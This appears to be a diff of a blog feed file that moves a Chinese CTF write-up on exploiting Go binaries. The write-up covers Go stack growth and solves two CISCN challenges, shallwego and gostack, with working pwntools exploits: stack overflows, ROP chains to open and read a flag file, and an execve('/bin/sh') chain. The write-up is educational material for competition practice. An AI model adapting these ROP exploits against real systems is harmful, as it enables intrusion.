-<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
-<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
-
-<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
-                      class=""
-                >
-
-<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
-                      class=""
-                >
-
-<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
-                      class=""
-                >
-
-<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
-<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
-                      class=""
-                >
-
-<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
-                      class=""
-                >
-
-<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
-                      class=""
-                >
-
-<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
-<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
-<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
-                      class=""
-                >
-
-<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
-                      class=""
-                >
-
-<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
-                      class=""
-                >
-
-<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
-
-<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
-<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
-                      class=""
-                >
-
-<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
-                      class=""
-                >
-
-<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
-                      class=""
-                >
-
-<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
-                      class=""
-                >
-
-<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
-                      class=""
-                >
-
-<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>go</tag>
-        <tag>ciscn wp</tag>
       </tags>
   </entry>
   <entry>
@@ -685,6 +603,218 @@
       </tags>
   </entry>
   <entry>
+    <title>gopwn初探</title>
+    <url>/blog/2024/09/22/go-pwn/</url>
+    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
+<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
+<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
+<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
+<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
+<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
+</ul>
+<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
+
+<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
+                      class=""
+                >
+
+<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
+<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
+                      class=""
+                >
+
+<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
+<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+
+<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
+                      class=""
+                >
+
+<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
+                      class=""
+                >
+
+<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
+                      class=""
+                >
+
+<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
+<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
+                      class=""
+                >
+
+<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
+                      class=""
+                >
+
+<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
+                      class=""
+                >
+
+<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
+<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
+                      class=""
+                >
+
+<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
+                      class=""
+                >
+
+<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
+                      class=""
+                >
+
+<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
+
+<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
